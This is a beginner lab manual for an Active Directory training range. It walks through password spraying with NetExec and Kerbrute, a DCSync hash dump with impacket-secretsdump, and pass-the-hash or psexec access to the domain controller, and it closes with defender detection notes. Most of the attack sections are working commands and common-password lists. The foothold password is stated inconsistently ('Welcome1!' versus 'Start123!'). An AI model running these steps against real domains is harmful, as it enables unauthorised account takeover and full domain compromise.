> **Self-hosted note (read first).** This manual was written for the hosted
> RootDC lab. In your own VM setup, three things differ:
>
> - **Attacker machine:** wherever the manual says Kali at `10.0.1.100` or
>   `ssh kali@10.0.1.100` (password `Start123!`), use **your own** Kali/Linux VM
>   on the same host-only network. Those hosted credentials do not apply here.
> - **Target DC IP:** wherever the manual uses a DC IP (e.g. `10.0.1.10`), use
>   **your** Windows Server VM's IP. Find it by running `ipconfig` on the DC.
> - **No flag / scoreboard:** there is nothing to submit. Success = you crack the
>   high-value account and authenticate as it.
>
> Your domain foothold account is **`attacker` / `Welcome1!`** (same as hosted).
> The exact target accounts for this lab are in `C:\RootDC\scenarios\` on the DC.


# Password Spray Attack - Lab Manual (Beginner)

## 1. Scenario Overview

**Password spraying** is a brute-force attack that tries a small number of commonly used passwords against many accounts simultaneously. Unlike traditional brute force (many passwords against one account), spraying avoids account lockout by staying under the lockout threshold.

**Why it matters:** Organizations with weak password policies are extremely vulnerable. A single compromised account can be the starting point for full domain compromise. Password spraying is one of the most common initial access techniques in real-world AD attacks.

**MITRE ATT&CK:** T1110.003 - Brute Force: Password Spraying

---

## 2. Objectives Recap

1. Enumerate valid domain users
2. Execute a password spray avoiding account lockout
3. Find accounts with weak passwords
4. Escalate privileges using compromised accounts

---

## 3. Starting Point

**Your attacker machine:** Kali Linux at `10.0.1.100` — all tools are pre-installed.

**Connect to your machine:**
```bash
ssh kali@10.0.1.100   # Password: Start123!
```

**Your domain credentials:**
- Username: `attacker`
- Password: `Start123!`
- Domain: `fallen.local`

**Network position:** You are a standard domain user. You attack the DC remotely from your Kali machine.

**Target:** Domain Controller DC01 at `10.0.1.10` (also saved in `/home/kali/lab/target`)

**Lab info:** Check `/home/kali/lab/README.txt` for scenario details.

---

## 4. Phase 1: Reconnaissance

### What to enumerate
- Valid domain usernames
- Password policy (lockout threshold, observation window)
- Account naming conventions

### Success signals
- You have a list of valid usernames
- You understand the lockout policy

### Commands

**Step 1: Check the password policy first!**
```bash
# Get domain password policy
nxc smb 10.0.1.10 -u 'attacker' -p 'Start123!' --pass-pol
```

Look for:
- Account lockout threshold (how many attempts before lockout)
- Lockout observation window (how long to wait between sprays)
- Minimum password length

**Step 2: Enumerate valid users**
```bash
# Enumerate domain users via LDAP
nxc smb 10.0.1.10 -u 'attacker' -p 'Start123!' --users
```

Save the usernames to a file:
```bash
nxc smb 10.0.1.10 -u 'attacker' -p 'Start123!' --users | awk '{print $5}' | grep -v '\[' > users.txt
```

**Alternative — Kerberos-based user enumeration (stealthier):**
```bash
# Validate discovered usernames via Kerberos (no LDAP/SMB needed)
kerbrute userenum --dc 10.0.1.10 -d fallen.local users.txt
```

---

## 5. Phase 2: Exploitation

### Tools available
- **nxc** (NetExec) — SMB-based password spray
- **kerbrute** — Kerberos-based spray (stealthier, no logon events)

### Execute the spray

**Using NetExec (SMB):**
```bash
# Spray a single password against all users
nxc smb 10.0.1.10 -u users.txt -p 'Password1' --no-bruteforce

# Try multiple common passwords (one at a time!)
nxc smb 10.0.1.10 -u users.txt -p 'Welcome1' --no-bruteforce
nxc smb 10.0.1.10 -u users.txt -p 'Passw0rd' --no-bruteforce
```

**Using Kerbrute (Kerberos):**
```bash
kerbrute passwordspray --dc 10.0.1.10 -d fallen.local users.txt 'Password1'
```

### Common passwords to try
- `Classic weak`: Password1, Passw0rd, Welcome1
- `Seasonal/simple`: Sunshine1, Summer09, Service1
- `Keyboard patterns`: Qwerty123, Abc12345

### Critical: Avoid lockout!
- Spray ONE password at a time
- Wait for the lockout observation window between sprays
- Never spray more attempts than (threshold - 1)

### Expected indicators
- NetExec shows `[+]` for successful authentication
- Kerbrute shows "VALID LOGIN" for hits

---

## 6. Phase 3: Privilege Escalation

### Path logic
1. You found one or more accounts with weak passwords
2. Most are standard domain users — but one has **DCSync rights** (replication permissions)
3. Try `impacket-secretsdump` with each compromised account to find the one that can DCSync

### Find the DCSync account

```bash
# Try each compromised account — only one will return hashes
impacket-secretsdump 'fallen.local/<account>:<password>@10.0.1.10' -just-dc-user Administrator
```

- Accounts **without** DCSync rights will fail with `ERROR_DS_DRA_BAD_DN`
- The account **with** DCSync rights will return the Administrator NTLM hash

The successful output looks like:
```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:<nt_hash>:::
```

---

## 7. Flag / Proof of Compromise

### How to validate success
The flag is located on the Administrator's Desktop on DC01.

### Where to find it
Use the Administrator's NTLM hash (from DCSync) with pass-the-hash:

```bash
# Pass-the-hash to read the flag
nxc smb 10.0.1.10 -u Administrator -H '<nt_hash>' -x 'type C:\Users\Administrator\Desktop\flag.txt'
```

Or get a shell:
```bash
impacket-psexec 'fallen.local/Administrator@10.0.1.10' -hashes ':<nt_hash>'
type C:\Users\Administrator\Desktop\flag.txt
```

---

## 8. Troubleshooting

### SSH to Kali
- Connect: `ssh kali@10.0.1.100` (password: `Start123!`)
- Host key error? Run `ssh-keygen -R 10.0.1.100`

### VPN Issues
- Ensure WireGuard is connected
- Test: `ping 10.0.1.10`

### Account locked out
- Wait for the lockout observation window to expire
- Use Kerberos-based spraying (no lockout increment for wrong passwords with valid users)
- Always check policy FIRST

### No valid passwords found
- Try more password variations
- Consider seasonal patterns, company name variations
- Check password policy for minimum length hints

---

## 9. Defender Notes

### Mitigations
- **Strong password policy** — 14+ character minimum
- **Account lockout** — Set threshold (e.g., 5 attempts)
- **Fine-grained password policies** for service/admin accounts
- **Azure AD Smart Lockout** or similar protection
- **Ban common passwords** via password filter

### Detection
- **Event ID 4625** — Multiple failed logons across different accounts
  - Same source IP, different accounts = spray pattern
- **Event ID 4771** — Kerberos pre-auth failed
- **Event ID 4776** — NTLM authentication failed
- Pattern: many accounts, few passwords, short time window

---

## 10. Learn More

- [Password Spraying - MITRE ATT&CK](https://attack.mitre.org/techniques/T1110/003/)
- [HackTricks - Password Spraying](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/password-spraying)
- [Microsoft - Password Spray Investigation](https://learn.microsoft.com/en-us/security/operations/incident-response-playbook-password-spray)
